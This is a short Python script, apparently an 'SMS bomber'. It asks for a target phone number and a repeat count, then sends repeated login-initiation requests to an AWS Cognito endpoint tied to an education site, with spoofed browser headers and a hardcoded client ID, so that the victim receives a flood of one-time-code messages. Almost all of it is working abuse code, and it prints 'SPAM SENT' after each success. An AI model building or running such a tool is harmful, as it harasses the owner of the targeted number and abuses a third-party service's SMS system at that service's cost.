import requests
import time 
print("""
8888888b.  888     888     888 888b     d888 8888888888       .d8888b.  8888888888 888b    888 8888888b.  8888888888 8888888b.  
888   Y88b 888     888     888 8888b   d8888 888             d88P  Y88b 888        8888b   888 888  "Y88b 888        888   Y88b 
888    888 888     888     888 88888b.d88888 888             Y88b.      888        88888b  888 888    888 888        888    888 
888   d88P 888     888     888 888Y88888P888 8888888          "Y888b.   8888888    888Y88b 888 888    888 8888888    888   d88P 
8888888P"  888     888     888 888 Y888P 888 888                 "Y88b. 888        888 Y88b888 888    888 888        8888888P"  
888        888     888     888 888  Y8P  888 888                   "888 888        888  Y88888 888    888 888        888 T88b   
888        888     Y88b. .d88P 888   "   888 888             Y88b  d88P 888        888   Y8888 888  .d88P 888        888  T88b  
888        88888888 "Y88888P"  888       888 8888888888       "Y8888P"  8888888888 888    Y888 8888888P"  8888888888 888   T88b 
                                                                                                                                
                                                                                                                                
                                                                                                                                
""")
num = str(input("Target Number:"))
tr= int(input("How many times you want to spam:"))

url = 'https://cognito-idp.ap-south-1.amazonaws.com/'

headers = {
    'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
    'Content-Type': 'application/x-amz-json-1.1',
    'Cache-Control': 'no-store',
    'X-Amz-Target': 'AWSCognitoIdentityProviderService.InitiateAuth',
    'X-Amz-User-Agent': 'aws-amplify/5.0.4 js',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept': '*/*',
    'Origin': 'https://www.prepladder.com',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://www.prepladder.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=4, i'
}

data = {
    "AuthFlow": "CUSTOM_AUTH",
    "ClientId": "69og9542ivfrk88hrijcs1i7t8",
    "AuthParameters": {
        "USERNAME": "+216"+num+""
    },
    "ClientMetadata": {}
}


for i in range(tr):
    response = requests.post(url, headers=headers, json=data)
    print(response.status_code)
    if response.status_code == 200:
        print(f"[{i}]SPAM SENT TO {num}")
    else:
        print(f"[{i}]Failed to spam (number might be blocked)")
    time.sleep(1.5)
#response = requests.post(url, headers=headers, json=data)
"""
print(response.status_code)
print(response.text)
"""
